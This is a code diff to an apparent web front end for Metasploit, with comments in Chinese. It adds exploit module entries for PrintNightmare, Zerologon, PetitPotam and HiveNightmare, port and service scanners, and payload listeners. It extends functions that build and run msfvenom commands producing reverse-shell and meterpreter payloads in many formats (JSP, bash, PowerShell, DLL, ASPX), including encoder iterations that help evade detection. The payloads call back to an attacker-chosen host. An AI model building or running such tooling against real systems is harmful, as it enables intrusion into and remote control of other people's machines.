+            'win_printnightmare': { path: 'exploit/windows/dcerpc/cve_2021_34527_printnightmare', desc: 'PrintNightmare CVE-2021-34527', needPayload: true },
+            'win_printspooler': { path: 'exploit/windows/dcerpc/printspooler_rce', desc: 'PrintSpooler RCE', needPayload: true },
+            'win_cve_2021_36934': { path: 'exploit/windows/local/hivenightmare', desc: 'HiveNightmare CVE-2021-36934', needPayload: true },
+            'win_cve_2021_1675': { path: 'exploit/windows/local/printnightmare_lpe', desc: 'PrintNightmare LPE', needPayload: true },
+            'win_noauth': { path: 'exploit/windows/dcerpc/cve_2020_1472_zerologon', desc: 'Zerologon CVE-2020-1472', needPayload: true },
+            'win_petitpotam': { path: 'exploit/windows/dcerpc/petitpotam', desc: 'PetitPotam LSA Spoofing', needPayload: true },
+
+            // 扫描与探测
+            'portscan': { path: 'auxiliary/scanner/portscan/tcp', desc: 'TCP端口扫描', needPayload: false },
+            'udp_scan': { path: 'auxiliary/scanner/portscan/udp', desc: 'UDP端口扫描', needPayload: false },
+            'http_dir': { path: 'auxiliary/scanner/http/dir_scanner', desc: 'HTTP目录扫描', needPayload: false },
+            'http_enum': { path: 'auxiliary/scanner/http/http_enum', desc: 'HTTP枚举', needPayload: false },
+            'dns_enum': { path: 'auxiliary/scanner/dns/dns_enum', desc: 'DNS枚举', needPayload: false },
+            'snmp_enum': { path: 'auxiliary/scanner/snmp/snmp_enum', desc: 'SNMP枚举', needPayload: false },
+            'ntp_enum': { path: 'auxiliary/scanner/ntp/ntp_enum', desc: 'NTP枚举', needPayload: false },
+            'fingerprint': { path: 'auxiliary/scanner/http/http_fingerprint', desc: 'HTTP指纹识别', needPayload: false },
+
+            // 监听器
+            'handler': { path: 'exploit/multi/handler', desc: '通用Payload监听器', needPayload: true },
+            'handler_https': { path: 'exploit/multi/handler', desc: 'HTTPS Payload监听器', needPayload: true },
+            'handler_bind': { path: 'exploit/multi/handler', desc: 'Bind Shell监听器', needPayload: true }
         };
 
         window.onload = function() {
@@ -683,15 +1005,21 @@
         function generatePayload() {
             const payload = document.getElementById('genPayload').value;
             const lhost = document.getElementById('genLhost').value;
-            const lport = '4444';
+            const lport = document.getElementById('genLport').value || '4444';
             const format = document.getElementById('genFormat').value;
+            const encoder = document.getElementById('genEncoder').value;
             const filename = `payload_${Date.now().toString(36)}.${format}`;
 
             if (!lhost) { alert("请输入 LHOST！"); return; }
 
-            const cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport} -f ${format} -o /tmp/${filename}`;
+            let cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=${lport}`;
+            if (encoder) {
+                cmd += ` -e ${encoder}`;
+            }
+            cmd += ` -f ${format} -o /tmp/${filename}`;
+
             quickCmd(cmd);
-            logOutput(`\n[GUI] 文件: /tmp/${filename}\n`);
+            logOutput(`\n[GUI] 生成中... /tmp/${filename}\n`);
             setTimeout(refreshPayloadFiles, 3000);
         }
 
@@ -835,11 +1163,66 @@
                     payload = 'php/meterpreter/reverse_tcp';
                     cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f raw > /tmp/${filename}`;
                     break;
+                case 'jsp':
+                    payload = 'java/jsp_shell_reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
+                case 'python':
+                    payload = 'python/meterpreter/reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
+                case 'bash':
+                    payload = 'cmd/unix/reverse_bash';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} > /tmp/${filename}`;
+                    break;
+                case 'powershell':
+                    payload = 'windows/x64/powershell/reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
+                case 'dll':
+                    payload = 'windows/x64/meterpreter/reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
+                case 'war':
+                    payload = 'java/jsp_shell_reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
+                case 'aspx':
+                    payload = 'windows/meterpreter/reverse_tcp';
+                    cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -f ${ext} -o /tmp/${filename}`;
+                    break;
             }
 
             quickCmd(cmd);
             logOutput(`\n[GUI] 生成中... /tmp/${filename}\n`);
             setTimeout(refreshPayloadFiles, 3000);
+        }
+
+        function generateEncodedPayload(type, ext, encoder, iterations = 1) {
+            const lhost = document.getElementById('genLhost').value || window.location.hostname;
+            const filename = `payload_encoded_${Date.now().toString(36)}.${ext}`;
+
+            let payload;
+            switch(type) {
+                case 'windows':
+                    payload = 'windows/x64/meterpreter/reverse_tcp';
+                    break;
+                case 'linux':
+                    payload = 'linux/x64/meterpreter/reverse_tcp';
+                    break;
+                default:
+                    payload = 'windows/x64/meterpreter/reverse_tcp';
+            }
+
+            let cmd = `msfvenom -p ${payload} LHOST=${lhost} LPORT=4444 -e ${encoder}`;
+            if (iterations > 1) {
+                cmd += ` -i ${iterations}`;
+            }
+            cmd += ` -f ${ext} -o /tmp/${filename}`;
+
+            quickCmd(cmd);
+            logOutput(`\n[GUI] 编码生成中 (编码器: ${encoder}, 迭代: ${iterations}次)... /tmp/${filename}\n`);
+            setTimeout(refreshPayloadFiles, 5000);
         }
 
         function refreshPayloadFiles() {
